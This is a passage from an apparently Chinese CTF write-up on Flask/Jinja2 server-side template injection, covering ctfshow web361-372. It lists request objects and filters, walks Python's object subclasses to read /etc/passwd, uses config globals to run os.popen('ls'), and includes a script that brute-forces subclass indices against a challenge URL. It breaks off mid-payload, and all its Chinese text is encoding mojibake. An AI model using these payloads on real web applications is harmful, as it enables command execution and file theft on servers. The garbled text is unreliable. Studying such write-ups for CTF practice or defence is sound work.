string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/proc\self\fd/3'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>x1    getä¼ å‚request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>x1  æ‰€æœ‰å‚æ•°request<span class="token punctuation">.</span>cookies      cookieså‚æ•°request<span class="token punctuation">.</span>headers      è¯·æ±‚å¤´å‚æ•°request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>x1    postä¼ å‚<span class="token punctuation">(</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span>applicaation<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencodedæˆ–multipart<span class="token operator">/</span>form<span class="token operator">-</span>data<span class="token punctuation">)</span>request<span class="token punctuation">.</span>data   postä¼ å‚<span class="token punctuation">(</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span>a<span class="token operator">/</span>b<span class="token punctuation">)</span>request<span class="token punctuation">.</span>json postä¼ json  <span class="token punctuation">(</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>json<span class="token punctuation">)</span>config               å½“å‰applicationçš„æ‰€æœ‰é…ç½®ã€‚æ­¤å¤–ï¼Œä¹Ÿå¯ä»¥è¿™æ ·<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>g                    <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>å¾—åˆ°<span class="token operator">&lt;</span>flask<span class="token punctuation">.</span>g of <span class="token string">'flask_ssti'</span><span class="token operator">></span></code></pre><h4 id="ä¸€äº›åˆ©ç”¨è¯­å¥"><a href="#ä¸€äº›åˆ©ç”¨è¯­å¥" class="headerlink" title="ä¸€äº›åˆ©ç”¨è¯­å¥"></a>ä¸€äº›åˆ©ç”¨è¯­å¥</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># è·å¾—ä¸€ä¸ªå­—ç¬¦ä¸²å®ä¾‹</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token string">''</span><span class="token comment"># è·å¾—å­—ç¬¦ä¸²çš„typeå®ä¾‹</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__ <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token comment"># è·å¾—å…¶çˆ¶ç±»</span><span class="token operator">>></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'basestring'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token comment"># è·å¾—çˆ¶ç±»ä¸­çš„objectç±»</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token comment"># è·å¾—objectç±»çš„å­ç±»ï¼Œä½†å‘ç°è¿™ä¸ª__subclasses__å±æ€§æ˜¯ä¸ªæ–¹æ³•</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> method __subclasses__ of <span class="token builtin">type</span> <span class="token builtin">object</span> at <span class="token number">0x10376d320</span><span class="token operator">></span><span class="token comment"># ä½¿ç”¨__subclasses__()æ–¹æ³•ï¼Œè·å¾—objectç±»çš„å­ç±»</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'type'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'weakref'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'weakcallableproxy'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'weakproxy'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'int'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'basestring'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'bytearray'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'list'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'NoneType'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'NotImplementedType'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'traceback'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'super'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'xrange'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'set'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'slice'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'staticmethod'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'complex'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'float'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'buffer'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'long'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'frozenset'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'property'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'memoryview'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'tuple'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'enumerate'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'reversed'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'code'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'frame'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'builtin_function_or_method'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'instancemethod'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'function'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'classobj'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dictproxy'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'generator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'getset_descriptor'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'wrapper_descriptor'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'instance'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'ellipsis'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'member_descriptor'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'file'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'PyCapsule'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'cell'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'callable-iterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'iterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.long_info'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.float_info'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'EncodingMap'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'fieldnameiterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'formatteriterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.version_info'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.flags'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'exceptions.BaseException'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'module'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'imp.NullImporter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'zipimport.zipimporter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'posix.stat_result'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'posix.statvfs_result'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'warnings.WarningMessage'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'warnings.catch_warnings'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_weakrefset._IterationGuard'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_weakrefset.WeakSet'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Hashable'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'classmethod'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Iterable'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Sized'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Container'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Callable'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict_keys'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict_items'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict_values'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site._Printer'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site._Helper'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'_sre.SRE_Pattern'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'_sre.SRE_Match'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'_sre.SRE_Scanner'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site.Quitter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.IncrementalEncoder'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.IncrementalDecoder'</span><span class="token operator">></span><span class="token punctuation">]</span><span class="token comment"># è·å¾—ç¬¬40ä¸ªå­ç±»çš„ä¸€ä¸ªå®ä¾‹ï¼Œå³ä¸€ä¸ªfileå®ä¾‹</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'file'</span><span class="token operator">></span><span class="token comment"># å¯¹fileåˆå§‹åŒ–</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token builtin">open</span> <span class="token builtin">file</span> <span class="token string">'/etc/passwd'</span><span class="token punctuation">,</span> mode <span class="token string">'r'</span> at <span class="token number">0x10397a8a0</span><span class="token operator">></span><span class="token comment"># ä½¿ç”¨fileçš„readå±æ€§è¯»å–ï¼Œä½†å‘ç°æ˜¯ä¸ªæ–¹æ³•</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> method read of <span class="token builtin">file</span> <span class="token builtin">object</span> at <span class="token number">0x10397a5d0</span><span class="token operator">></span><span class="token comment"># ä½¿ç”¨read()æ–¹æ³•è¯»å–</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>nobody<span class="token punctuation">:</span><span class="token operator">*</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span>Unprivileged User<span class="token punctuation">:</span><span class="token operator">/</span>var<span class="token operator">/</span>empty<span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>falseroot<span class="token punctuation">:</span><span class="token operator">*</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span>System Administrator<span class="token punctuation">:</span><span class="token operator">/</span>var<span class="token operator">/</span>root<span class="token punctuation">:</span><span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>sh</code></pre><p>å¸¸ç”¨è¿‡æ»¤å™¨</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šå°†å€¼è½¬æ¢ä¸º<span class="token builtin">int</span>ç±»å‹ï¼›<span class="token builtin">float</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šå°†å€¼è½¬æ¢ä¸º<span class="token builtin">float</span>ç±»å‹ï¼›lower<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ï¼›upper<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§å†™ï¼›title<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šæŠŠå€¼ä¸­çš„æ¯ä¸ªå•è¯çš„é¦–å­—æ¯éƒ½è½¬æˆå¤§å†™ï¼›capitalize<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šæŠŠå˜é‡å€¼çš„é¦–å­—æ¯è½¬æˆå¤§å†™ï¼Œå…¶ä½™å­—æ¯è½¬å°å†™ï¼›trim<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šæˆªå–å­—ç¬¦ä¸²å‰é¢å’Œåé¢çš„ç©ºç™½å­—ç¬¦ï¼›wordcount<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šè®¡ç®—ä¸€ä¸ªé•¿å­—ç¬¦ä¸²ä¸­å•è¯çš„ä¸ªæ•°ï¼›reverse<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šå­—ç¬¦ä¸²åè½¬ï¼›replace<span class="token punctuation">(</span>value<span class="token punctuation">,</span>old<span class="token punctuation">,</span>new<span class="token punctuation">)</span>ï¼š æ›¿æ¢å°†oldæ›¿æ¢ä¸ºnewçš„å­—ç¬¦ä¸²ï¼›truncate<span class="token punctuation">(</span>value<span class="token punctuation">,</span>length<span class="token operator">=</span><span class="token number">255</span><span class="token punctuation">,</span>killwords<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>ï¼šæˆªå–lengthé•¿åº¦çš„å­—ç¬¦ä¸²ï¼›striptags<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šåˆ é™¤å­—ç¬¦ä¸²ä¸­æ‰€æœ‰çš„HTMLæ ‡ç­¾ï¼Œå¦‚æœå‡ºç°å¤šä¸ªç©ºæ ¼ï¼Œå°†æ›¿æ¢æˆä¸€ä¸ªç©ºæ ¼ï¼›escape<span class="token punctuation">(</span><span class="token punctuation">)</span>æˆ–eï¼šè½¬ä¹‰å­—ç¬¦ï¼Œä¼šå°†<span class="token operator">&lt;</span>ã€<span class="token operator">></span>ç­‰ç¬¦å·è½¬ä¹‰æˆHTMLä¸­çš„ç¬¦å·ã€‚æ˜¾ä¾‹ï¼šcontent<span class="token operator">|</span>escapeæˆ–content<span class="token operator">|</span>eã€‚safe<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼š ç¦ç”¨HTMLè½¬ä¹‰ï¼Œå¦‚æœå¼€å¯äº†å…¨å±€è½¬ä¹‰ï¼Œé‚£ä¹ˆsafeè¿‡æ»¤å™¨ä¼šå°†å˜é‡å…³æ‰è½¬ä¹‰ã€‚ç¤ºä¾‹ï¼š <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">'&lt;em>hello&lt;/em>'</span><span class="token operator">|</span>safe<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>ï¼›<span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šå°†å˜é‡åˆ—æˆåˆ—è¡¨ï¼›string<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šå°†å˜é‡è½¬æ¢æˆå­—ç¬¦ä¸²ï¼›join<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šå°†ä¸€ä¸ªåºåˆ—ä¸­çš„å‚æ•°å€¼æ‹¼æ¥æˆå­—ç¬¦ä¸²ã€‚ç¤ºä¾‹çœ‹ä¸Šé¢payloadï¼›<span class="token builtin">abs</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šè¿”å›ä¸€ä¸ªæ•°å€¼çš„ç»å¯¹å€¼ï¼›first<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šè¿”å›ä¸€ä¸ªåºåˆ—çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼›last<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šè¿”å›ä¸€ä¸ªåºåˆ—çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼›<span class="token builtin">format</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span>arags<span class="token punctuation">,</span><span class="token operator">*</span>kwargs<span class="token punctuation">)</span>ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚æ¯”å¦‚ï¼š<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> <span class="token string">"%s"</span> <span class="token operator">-</span> <span class="token string">"%s"</span><span class="token operator">|</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">'Hello?'</span><span class="token punctuation">,</span><span class="token string">"Foo!"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>å°†è¾“å‡ºï¼šHelloo? <span class="token operator">-</span> Foo!length<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šè¿”å›ä¸€ä¸ªåºåˆ—æˆ–è€…å­—å…¸çš„é•¿åº¦ï¼›<span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šè¿”å›åˆ—è¡¨å†…æ•°å€¼çš„å’Œï¼›sort<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šè¿”å›æ’åºåçš„åˆ—è¡¨ï¼›default<span class="token punctuation">(</span>value<span class="token punctuation">,</span>default_value<span class="token punctuation">,</span>boolean<span class="token operator">=</span>false<span class="token punctuation">)</span>ï¼šå¦‚æœå½“å‰å˜é‡æ²¡æœ‰å€¼ï¼Œåˆ™ä¼šä½¿ç”¨å‚æ•°ä¸­çš„å€¼æ¥ä»£æ›¿ã€‚ç¤ºä¾‹ï¼šname<span class="token operator">|</span>default<span class="token punctuation">(</span><span class="token string">'xiaotuo'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>å¦‚æœnameä¸å­˜åœ¨ï¼Œåˆ™ä¼šä½¿ç”¨xiaotuoæ¥æ›¿ä»£ã€‚boolean<span class="token operator">=</span><span class="token boolean">False</span>é»˜è®¤æ˜¯åœ¨åªæœ‰è¿™ä¸ªå˜é‡ä¸ºundefinedçš„æ—¶å€™æ‰ä¼šä½¿ç”¨defaultä¸­çš„å€¼ï¼Œå¦‚æœæƒ³ä½¿ç”¨pythonçš„å½¢å¼åˆ¤æ–­æ˜¯å¦ä¸ºfalseï¼Œåˆ™å¯ä»¥ä¼ é€’boolean<span class="token operator">=</span>trueã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨<span class="token keyword">or</span>æ¥æ›¿æ¢ã€‚length<span class="token punctuation">(</span><span class="token punctuation">)</span>è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œåˆ«åæ˜¯count</code></pre><p><a href="https://www.freebuf.com/articles/web/328222.html">CTF å¯¹SSTIçš„ä¸€äº›æ€»ç»“</a></p><h3 id="web361-372"><a href="#web361-372" class="headerlink" title="web361-372"></a>web361-372</h3><h4 id="web361-os-wrap-close"><a href="#web361-os-wrap-close" class="headerlink" title="web361(os._wrap_close)"></a>web361(os._wrap_close)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token operator">*</span><span class="token number">7</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">?</span>name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string double-quoted-string">""</span><span class="token operator">.</span>__class__<span class="token operator">.</span>__base__<span class="token operator">.</span><span class="token function">__subclasses__</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="web361.png" loading="lazy"></p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨è„šæœ¬æŸ¥æ‰¾</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdm<span class="token keyword">for</span> i <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">233</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">'https://589fbc1b-7f84-4f77-97bc-d20ad9e2b2b9.challenge.ctf.show/?name=&#123;&#123;%22%22.__class__.__bases__[0].__subclasses__()['</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">']&#125;&#125;'</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">'os._wrap_close'</span> <span class="token keyword">in</span> r<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span></code></pre><p>ç„¶ååˆ©ç”¨<strong>os._wrap_close</strong>ç±»<strong>init.globals</strong>æ¥æ‰¾osç±»ä¸­çš„ã€‚initåˆå§‹åŒ–ï¼Œglobalså…¨å±€æŸ¥æ‰¾</p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string double-quoted-string">""</span><span class="token operator">.</span>__class__<span class="token operator">.</span>__base__<span class="token operator">.</span><span class="token function">__subclasses__</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">132</span><span class="token punctuation">]</span><span class="token operator">.</span>__init__<span class="token operator">.</span>__globals__<span class="token punctuation">[</span><span class="token string 